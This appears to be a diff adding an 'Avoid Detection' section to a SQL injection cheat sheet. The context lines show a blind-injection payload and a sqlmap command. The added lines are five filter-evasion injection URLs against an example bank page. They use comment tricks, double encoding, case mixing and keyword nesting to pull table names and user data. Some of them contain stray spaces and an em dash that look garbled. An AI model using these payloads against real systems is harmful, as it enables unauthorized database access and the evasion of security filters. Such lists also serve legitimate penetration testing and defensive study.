@@ -254,3 +254,12 @@ value' AND (select Ascii(SUBSTR(global_name,1,1)) from global_name) <128 OR '4'=
 
 ## SQLMap:
 `python3 sqlmap.py -u <URL> --cookie "JSESSIONID=<ID>;" --data "<Post Data>" -p <Inject Parameter>`
+
+## Avoid Detection:
+```
+http://www.bank.com/accounts.php?id=/*!union*/+/*!select*/+1,2,concat(/ *!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_s ChEMa*/+like+database()—
+http://www.bank.com/accounts.php?id=1%252f%252a*/union%252f%252a/select %25f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--
+http://www.bank.com/accounts.php?id=1+UnIoN/**/SeLecT/**/1,2,3--
+http://www.bank.com/accounts.php?id=1+UNunionION+SEselectLECT+1,2,3--
+http://www.bank.com/accounts.php?id=1+uni%0bon+se%0blect+1,2,3--
+```
